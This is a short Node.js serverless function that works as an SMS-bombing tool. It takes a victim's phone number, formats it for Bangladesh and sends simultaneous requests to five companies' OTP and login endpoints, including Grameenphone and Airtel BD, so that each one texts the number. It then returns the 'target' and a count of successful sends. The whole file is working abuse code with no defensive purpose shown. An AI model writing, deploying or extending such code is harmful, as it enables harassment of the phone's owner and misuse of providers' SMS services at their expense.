module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { phone } = req.query;
  if (!phone) return res.status(400).json({ error: "Phone number required" });

  // Formatting Number
  let clean = phone.replace(/\D/g, '');
  if (clean.startsWith('880')) clean = clean.slice(3);
  if (clean.startsWith('0')) clean = clean.slice(1);
  
  const fmt = {
    raw: '0' + clean,
    with880: '880' + clean,
    plus880: '+880' + clean
  };

  const start = Date.now();

  // API List with native fetch
  const apis = [
    { url: 'https://weblogin.grameenphone.com/backend/api/v1/otp', method: 'POST', body: { msisdn: fmt.raw } },
    { url: 'https://cokestudio23.sslwireless.com/api/check-gp-number', method: 'POST', body: { msisdn: fmt.raw } },
    { url: 'https://api.osudpotro.com/api/v1/users/send_otp', method: 'POST', body: { mobile: '+88-' + fmt.raw, deviceToken: 'web', os: 'web' } },
    { url: 'https://apix.rabbitholebd.com/appv2/login/requestOTP', method: 'POST', body: { mobile: fmt.plus880 } },
    { url: 'https://api.bd.airtel.com/v1/account/login/otp', method: 'POST', body: { phone_number: fmt.raw } }
  ];

  const requests = apis.map(api => 
    fetch(api.url, {
      method: api.method,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(api.body)
    }).then(r => r.ok).catch(() => false)
  );

  const results = await Promise.all(requests);
  const time = ((Date.now() - start) / 1000).toFixed(1);

  return res.status(200).json({
    target: fmt.raw,
    total: results.length,
    successful: results.filter(status => status === true).length,
    time_seconds: time
  });
};
